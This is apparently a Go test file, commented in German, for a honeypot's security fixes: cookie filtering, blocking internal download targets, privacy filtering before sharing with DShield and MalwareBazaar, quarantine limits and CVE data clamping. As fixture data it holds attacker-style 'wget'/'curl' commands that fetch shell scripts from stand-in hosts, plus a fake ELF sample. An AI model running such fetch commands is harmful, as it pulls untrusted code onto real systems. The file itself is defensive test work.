package main

// Tests zu den Funden der Sicherheitsprüfung der zusammengeführten Neuerungen
// (Weitergabe, Dateien sammeln, CVE-Datenbank, KI-Webantworten).

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"io"
	"math"
	"mime"
	"mime/multipart"
	"net/http"
	"net/http/httptest"
	"net/netip"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// Cookies aus Modell-Antworten: nie der Sitzungs-Cookie der Hive-UI, keine Domain, kein Präfix.
func TestSafeSetCookie(t *testing.T) {
	ok := map[string]string{
		"JSESSIONID=ABC123; Path=/manager; HttpOnly": "JSESSIONID=ABC123; Path=/; HttpOnly",
		"PHPSESSID=x9; Domain=example.org; Secure":   "PHPSESSID=x9; Path=/; HttpOnly",
		"lang=en": "lang=en; Path=/; HttpOnly",
		"KC_RESTART=eyJhbGciOiJIUzI1NiJ9.e30.sig; Path=/": "KC_RESTART=eyJhbGciOiJIUzI1NiJ9.e30.sig; Path=/; HttpOnly",
	}
	for in, want := range ok {
		if got := safeSetCookie(in); got != want {
			t.Errorf("%q -> %q, erwartet %q", in, got, want)
		}
	}
	for _, in := range []string{"hv_session=abc; Path=/api", "HV_SESSION=abc", "__Host-x=1; Path=/", "__Secure-x=1",
		"=wert", "a b=1", `x="1"`, "x=1,2", "keinwert"} {
		if got := safeSetCookie(in); got != "" {
			t.Errorf("%q durchgelassen: %q", in, got)
		}
	}
	out := safeWebHeaders(map[string]string{"Set-Cookie": "hv_session=1; Domain=example.org", "X-Powered-By": "PHP/8.1"})
	if _, ok := out["Set-Cookie"]; ok || out["X-Powered-By"] != "PHP/8.1" {
		t.Fatalf("Kopfzeilen: %v", out)
	}
}

// IPv4-kompatible und SIIT-Adressen, 6to4-Relais: nie Ziel eines Downloads.
func TestSpecialIPEmbedded(t *testing.T) {
	for _, s := range []string{"::7f00:1", "::a00:1", "::ffff:0:7f00:1", "::ffff:0:c0a8:1", "192.88.99.1", "::1", "::"} {
		if specialIP(netip.MustParseAddr(s), "") == "" {
			t.Errorf("%s gilt als zulässig", s)
		}
	}
	if why := specialIP(netip.MustParseAddr("2a00:1450:4001:80e::200e"), ""); why != "" {
		t.Errorf("öffentliche IPv6-Adresse abgelehnt: %s", why)
	}
}

// Nachlade-Adressen mit der eigenen öffentlichen IP oder dem Hostnamen des Honeypots im Pfad
// oder in Parametern gehen nicht an URLhaus und werden nicht geholt.
func TestURLFindingsOwnMarkers(t *testing.T) {
	allowDoc(t)
	setOwnNets(OwnNets{Private: true})
	h := shareHive(t)
	h.st.lookupPut("self", "internetdb", `{"ip":"198.51.100.40"}`)
	h.st.SetKV("sensor_config", `{"hostname":"gartenhaus-nas"}`)
	addEvent(h, "command", "ssh", "203.0.113.50", "", "", map[string]any{"input": "wget http://198.51.100.20/x.sh"})
	addEvent(h, "command", "ssh", "203.0.113.51", "", "", map[string]any{"input": "wget http://198.51.100.21/r?t=198.51.100.40"})
	addEvent(h, "command", "ssh", "203.0.113.52", "", "", map[string]any{"input": "curl http://198.51.100.22/Gartenhaus-NAS/a.sh"})
	got, err := h.urlFindings(context.Background(), time.Now().Add(-time.Hour), nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(got) != 1 || got[0].URL != "http://198.51.100.20/x.sh" {
		t.Fatalf("Funde: %+v", got)
	}
}

// DShield: Kopfzeilen mit eigenen Namen und Adressen (Referer, Origin, X-Forwarded-Host, Cookie)
// gehen nie hinaus; ohne bekannte eigene Adresse gar keine Web-Anfragen.
func TestDShieldWebPrivacy(t *testing.T) {
	allowDoc(t)
	setOwnNets(OwnNets{Private: true})
	h := shareHive(t)
	d, _ := json.Marshal(map[string]any{"method": "GET", "path": "/x", "user_agent": "curl/8", "version": "HTTP/1.1",
		"headers": "Host: nas.example.org\nReferer: http://nas.example.org/\nOrigin: http://nas.example.org\nX-Forwarded-Host: nas.example.org\nCookie: JSESSIONID=1\nAccept: */*"})
	h.st.db.Exec(`INSERT INTO events(ts,type,src_ip,src_port,dst_port,service,data) VALUES(?,?,?,?,?,?,?)`,
		time.Now().Add(-5*time.Minute).UnixMilli(), "request", "203.0.113.52", 40000, 80, "http", string(d))
	cfg := DShieldConfig{Enabled: true, Web: true}

	b, err := h.dshieldCollect(context.Background(), cfg, 0, time.Now().Add(-time.Minute))
	if err != nil || len(b.web) != 0 || !b.webSkipped {
		t.Fatalf("ohne eigene Adresse gesendet: %v %v", b.web, err)
	}
	h.st.lookupPut("self", "internetdb", `{"ip":"198.51.100.40"}`)
	b, _ = h.dshieldCollect(context.Background(), cfg, 0, time.Now().Add(-time.Minute))
	if len(b.web) != 1 || b.webSkipped {
		t.Fatalf("Web: %+v", b)
	}
	hdr := b.web[0]["headers"].(map[string]string)
	if len(hdr) != 1 || hdr["Accept"] != "*/*" {
		t.Fatalf("Kopfzeilen: %v", hdr)
	}
}

// MalwareBazaar: Dateien mit der eigenen Adresse oder dem Namen des Honeypots werden nicht
// hochgeladen (öffentlich), auch wenn sie sonst in Frage kämen.
func TestBazaarSkipsOwnMarkers(t *testing.T) {
	allowDoc(t)
	uploads := 0
	bazaar := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if ct, params, _ := mime.ParseMediaType(r.Header.Get("Content-Type")); ct == "multipart/form-data" {
			mr := multipart.NewReader(r.Body, params["boundary"])
			for p, err := mr.NextPart(); err == nil; p, err = mr.NextPart() {
				io.Copy(io.Discard, p)
			}
			uploads++
			io.WriteString(w, `{"query_status":"inserted"}`)
			return
		}
		io.WriteString(w, `{"query_status":"hash_not_found"}`)
	}))
	defer bazaar.Close()
	oldB := bazaarBase
	bazaarBase = bazaar.URL
	t.Cleanup(func() { bazaarBase = oldB })

	h := shareHive(t)
	h.st.lookupPut("self", "internetdb", `{"ip":"198.51.100.40"}`)
	x := h.Extras()
	x.AbuseChKey = "k"
	x.Bazaar = BazaarConfig{Lookup: true, Upload: true}
	elf := mk("\x7fE", "LF\x01\x01\x01") + strings.Repeat("\x00", 11) + "\x28\x00" + strings.Repeat("B", 200)
	files := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		io.WriteString(w, elf+" target=198.51.100.40")
	}))
	defer files.Close()
	res, err := testFetcher(1<<20).fetchTo(context.Background(), hostURL(files, "dl.malware-host.net", "/a"), h.quarantineDir())
	if err != nil {
		t.Fatal(err)
	}
	si, err := h.loadSample(res.SHA256)
	if err != nil || !bazaarEligible(si) {
		t.Fatalf("Auswertung: %+v %v", si, err)
	}
	h.bazaarHandle(context.Background(), x, res.SHA256, si, "http://198.51.100.20/a")
	if uploads != 0 {
		t.Fatal("Datei mit eigener Adresse hochgeladen")
	}
	if lg := h.share.channel("bazaar").Log; len(lg) != 1 || lg[0].Status != "skipped" {
		t.Fatalf("Protokoll: %+v", lg)
	}
}

// Die Platzgrenze der Quarantäne gilt vor jedem Download (Reserve für die neue Datei).
func TestQuarantineReserve(t *testing.T) {
	h := shareHive(t)
	dir := h.quarantineDir()
	os.MkdirAll(dir, 0o700)
	var names []string
	for i, c := range []string{"a", "b"} {
		content := strings.Repeat(c, 4<<20)
		sh := sha256.Sum256([]byte(content))
		sum := hex.EncodeToString(sh[:])
		p := filepath.Join(dir, sum)
		os.WriteFile(p, []byte(content), 0o600)
		ts := time.Now().Add(-time.Duration(3-i) * time.Hour)
		os.Chtimes(p, ts, ts)
		names = append(names, sum)
	}
	cfg := SampleCollectConfig{KeepDays: 14, MaxTotalMB: 10, MaxMB: 4}
	h.cleanupQuarantine(cfg, true) // 8 MB < 10 MB: bleibt
	if _, total := quarantineScan(dir); total != 8<<20 {
		t.Fatalf("ohne Reserve gelöscht: %d", total)
	}
	h.cleanupQuarantineRes(cfg, true, 4<<20) // 8 + 4 > 10: die älteste geht
	exists := func(n string) bool { _, err := os.Stat(filepath.Join(dir, n)); return err == nil }
	if exists(names[0]) || !exists(names[1]) {
		t.Fatalf("älteste %v, neuere %v", exists(names[0]), exists(names[1]))
	}
}

// Antworten von NVD und EPSS sind nicht vertrauenswürdig: Werte begrenzen.
func TestCVEValuesClamped(t *testing.T) {
	for in, want := range map[string]float64{"0.5": 0.5, "NaN": 0, "Inf": 0, "-0.1": 0, "1.5": 0, "x": 0, "1": 1} {
		if got := epssValue(in); got != want && !(math.IsNaN(got) && math.IsNaN(want)) {
			t.Errorf("epssValue(%q) = %v", in, got)
		}
	}
	long := strings.Repeat("A", 5000)
	raw := `{"vulnerabilities":[{"cve":{"id":"CVE-2021-1","published":"2021-01-01","descriptions":[{"lang":"en","value":"x"}],
		"metrics":{"cvssMetricV31":[{"type":"Primary","cvssData":{"version":"` + long + `","baseScore":99,"baseSeverity":"` + long + `"}}]},
		"weaknesses":[{"description":[{"lang":"en","value":"CWE-` + long + `"},{"lang":"en","value":"CWE-79"}]}]}}]}`
	d, err := parseNVD([]byte(raw))
	if err != nil {
		t.Fatal(err)
	}
	if d.CVSS != 0 || len(d.Version) > 10 || len(d.Severity) > 20 || len(d.CWE) != 1 || d.CWE[0] != "CWE-79" {
		t.Fatalf("NVD: score %v, version %d, severity %d, cwe %v", d.CVSS, len(d.Version), len(d.Severity), d.CWE)
	}
}

// Leser dürfen über /api/cve/info keine NVD-Abfragen mit dem Schlüssel des Admins auslösen.
func TestCVEInfoViewerNoEnqueue(t *testing.T) {
	resetCVEQueue()
	t.Cleanup(resetCVEQueue)
	h := testHive(t)
	if !h.Extras().CVEDB.Enabled {
		x := h.Extras()
		x.CVEDB.Enabled = true
		b, _ := json.Marshal(x)
		h.st.SetKV("extras", string(b))
		h.loadExtras()
	}
	h.auth = NewAuth(h.st, "tok", false)
	h.cveInfoAPI(httptest.NewRecorder(), httptest.NewRequest("GET", "/api/cve/info?ids=CVE-2099-0001,CVE-2099-0002", nil))
	if st := h.cveStatus(); st.Pending != 0 {
		t.Fatalf("ohne Admin in die Warteschlange gestellt: %d", st.Pending)
	}
	if info := h.cveInfosQ(context.Background(), []string{"CVE-2099-0003"}, true); !info["CVE-2099-0003"].Pending {
		t.Fatal("Admin-Abruf stellt nicht in die Warteschlange")
	}
}
